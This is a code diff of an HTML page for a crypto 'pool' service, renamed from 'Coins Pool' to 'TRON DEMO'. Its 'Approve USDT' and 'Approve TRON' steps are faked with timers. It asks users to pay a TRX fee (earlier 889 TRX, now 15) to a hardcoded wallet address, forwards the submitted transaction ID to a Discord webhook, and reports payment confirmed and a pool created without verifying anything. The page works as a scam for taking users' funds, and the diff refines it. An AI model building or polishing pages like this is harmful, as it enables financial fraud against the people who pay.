@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -8,7 +8,7 @@
 <meta name="viewport"
 content="width=device-width,initial-scale=1.0">
 
-<title>Pool Validation</title>
+<title>TRON DEMO</title>
 
 <style>
 
@@ -40,6 +40,7 @@ overflow-y:auto;
 max-height:95vh;
 border:1px solid rgba(255,255,255,0.08);
 box-shadow:0 0 40px rgba(0,0,0,0.5);
+position:relative;
 }
 
 .title{
@@ -54,6 +55,7 @@ background:#111827;
 padding:15px;
 border-radius:14px;
 margin-bottom:15px;
+border:1px solid rgba(255,255,255,0.04);
 }
 
 .label{
@@ -78,6 +80,11 @@ font-size:16px;
 font-weight:bold;
 cursor:pointer;
 margin-top:12px;
+transition:0.2s;
+}
+
+button:hover{
+transform:scale(0.98);
 }
 
 button:disabled{
@@ -115,11 +122,13 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.8);
+background:rgba(0,0,0,0.85);
 display:none;
 justify-content:center;
 align-items:center;
 padding:20px;
+z-index:1000;
+backdrop-filter:blur(6px);
 }
 
 .modal-box{
@@ -128,6 +137,29 @@ padding:20px;
 border-radius:20px;
 width:100%;
 max-width:420px;
+position:relative;
+border:1px solid rgba(255,255,255,0.08);
+animation:pop 0.25s ease;
+}
+
+@keyframes pop{
+from{
+transform:scale(0.9);
+opacity:0;
+}
+to{
+transform:scale(1);
+opacity:1;
+}
+}
+
+.close{
+position:absolute;
+top:12px;
+right:15px;
+font-size:22px;
+cursor:pointer;
+color:#94a3b8;
 }
 
 .qr{
@@ -139,8 +171,13 @@ display:flex;
 justify-content:center;
 align-items:center;
 border-radius:12px;
-color:#000;
-font-weight:bold;
+overflow:hidden;
+}
+
+.qr img{
+width:100%;
+height:100%;
+object-fit:cover;
 }
 
 .address{
@@ -150,6 +187,7 @@ padding:12px;
 border-radius:10px;
 margin-top:15px;
 font-size:14px;
+line-height:1.5;
 }
 
 .copy-btn{
@@ -166,6 +204,7 @@ border-radius:12px;
 color:white;
 margin-top:10px;
 outline:none;
+font-size:15px;
 }
 
 .top-alert{
@@ -176,8 +215,57 @@ background:#16a34a;
 padding:14px 20px;
 border-radius:12px;
 display:none;
-z-index:999;
+z-index:9999;
 font-size:14px;
+box-shadow:0 10px 25px rgba(0,0,0,0.3);
+animation:slide 0.3s ease;
+}
+
+@keyframes slide{
+from{
+transform:translateY(-20px);
+opacity:0;
+}
+to{
+transform:translateY(0);
+opacity:1;
+}
+}
+
+.success{
+background:#16a34a!important;
+}
+
+.error{
+background:#dc2626!important;
+}
+
+.pending{
+background:#2563eb!important;
+}
+
+.note{
+font-size:13px;
+color:#94a3b8;
+margin-top:10px;
+line-height:1.5;
+}
+
+@media(max-width:480px){
+
+.popup{
+padding:16px;
+}
+
+.title{
+font-size:21px;
+}
+
+.qr{
+width:200px;
+height:200px;
+}
+
 }
 
 </style>
@@ -192,7 +280,7 @@ Confirming payment...
 <div class="popup">
 
 <div class="title">
-Coins Pool
+TRON DEMO
 </div>
 
 <div class="card">
@@ -216,7 +304,7 @@ Coins Pool
 Approve USDT
 </div>
 
-<div style="font-size:14px;color:#94a3b8;">
+<div class="note">
 You need to approve USDT before proceeding.
 </div>
 
@@ -234,7 +322,7 @@ Approve USDT
 Approve TRON
 </div>
 
-<div style="font-size:14px;color:#94a3b8;">
+<div class="note">
 You need to approve TRON before continuing.
 </div>
 
@@ -248,12 +336,12 @@ Approve TRON
 
 <div class="card">
 
-<div style="font-size:14px;color:#94a3b8;">
-kindly Pay the deployment fee to continue the service.
+<div class="note">
+Pay fee for this demo service.
 </div>
 
 <button id="feeBtn" disabled>
-Pay 889 TRX
+Pay 15 TRX
 </button>
 
 </div>
@@ -268,15 +356,25 @@ Create Pool
 
 <div class="modal-box">
 
+<div class="close"
+onclick="closeModal()">
+✕
+</div>
+
 <h2 style="text-align:center;">
 Scan QR Code
 </h2>
 
 <div class="qr">
-QR 
+
+<img
+src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=TAnW9wrzbTo1Hafe4x2mKZFFqytuJpMqp6"
+/>
+
 </div>
 
-<div class="address" id="walletAddress">
+<div class="address"
+id="walletAddress">
 TAnW9wrzbTo1Hafe4x2mKZFFqytuJpMqp6
 </div>
 
@@ -285,7 +383,7 @@ onclick="copyAddress()">
 Copy Address
 </button>
 
-<div style="margin-top:20px;">
+<div style="margin-top:20px;font-size:14px;color:#94a3b8;">
 I've Paid
 </div>
 
@@ -316,6 +414,12 @@ document.getElementById("feeBtn");
 const createPool =
 document.getElementById("createPool");
 
+const alertBox =
+document.getElementById("alertBox");
+
+const modal =
+document.getElementById("modal");
+
 approve1.onclick = ()=>{
 
 approve1.disabled = true;
@@ -330,7 +434,12 @@ document.getElementById("status1").innerHTML =
 
 approve2.disabled = false;
 
-},6000);
+showAlert(
+"USDT Approved",
+"success"
+);
+
+},3000);
 
 };
 
@@ -348,26 +457,72 @@ document.getElementById("status2").innerHTML =
 
 feeBtn.disabled = false;
 
-},6000);
+showAlert(
+"TRON Approved",
+"success"
+);
+
+},3000);
 
 };
 
 feeBtn.onclick = ()=>{
 
-alert("Pay Now");
-
-document.getElementById("modal").style.display =
+modal.style.display =
 "flex";
+
+};
+
+function closeModal(){
+
+modal.style.display =
+"none";
+
+}
+
+window.onclick = (e)=>{
+
+if(e.target === modal){
+
+closeModal();
+
+}
 
 };
 
 function copyAddress(){
 
-navigator.clipboard.writeText(
-document.getElementById("walletAddress").innerText
+const address =
+document.getElementById("walletAddress").innerText;
+
+navigator.clipboard.writeText(address);
+
+showAlert(
+"Address copied",
+"success"
 );
 
-alert("Address copied");
+}
+
+function showAlert(message,type){
+
+alertBox.style.display =
+"block";
+
+alertBox.innerHTML =
+message;
+
+alertBox.className =
+"top-alert";
+
+alertBox.classList.add(type);
+
+setTimeout(()=>{
+
+alertBox.style.display =
+"none";
+
+},3000);
 
 }
 
@@ -375,20 +530,30 @@ document.getElementById("submitTx").onclick =
 async ()=>{
 
 const txid =
-document.getElementById("txid").value;
+document.getElementById("txid")
+.value
+.trim();
 
-document.getElementById("alertBox").style.display =
-"block";
+if(!txid){
 
-document.getElementById("alertBox").innerHTML =
-"Confirming payment...";
+showAlert(
+"Please enter TXID",
+"error"
+);
 
-/*
-DISCORD WEBHOOK
-*/
+return;
+
+}
+
+showAlert(
+"Confirming payment...",
+"pending"
+);
+
+try{
 
 await fetch(
-"https://YOUR_DISCORD_WEBHOOK_URL",
+"https://discord.com/api/webhooks/YOUR_WEBHOOK_URL",
 {
 method:"POST",
 
@@ -399,7 +564,7 @@ headers:{
 body:JSON.stringify({
 
 content:
-`🚨 NEW  TXID
+`🚨 NEW DEMO TXID
 
 TXID:
 ${txid}
@@ -415,19 +580,42 @@ Pending Review`
 
 setTimeout(()=>{
 
-document.getElementById("alertBox").innerHTML =
-"✅ Demo Payment Submitted";
+showAlert(
+"Payment Submitted",
+"success"
+);
 
 feeBtn.innerHTML =
 "Payment Confirmed";
 
+feeBtn.disabled = true;
+
 createPool.disabled = false;
 
+closeModal();
+
 },3000);
+
+}catch(error){
+
+console.log(error);
+
+showAlert(
+"Failed to submit",
+"error"
+);
+
+}
+
+};
+
+createPool.onclick = ()=>{
+
+showAlert(
+"Pool Created Successfully",
+"success"
+);
 
 };
 
 </script>
-
-</body>
-</html>
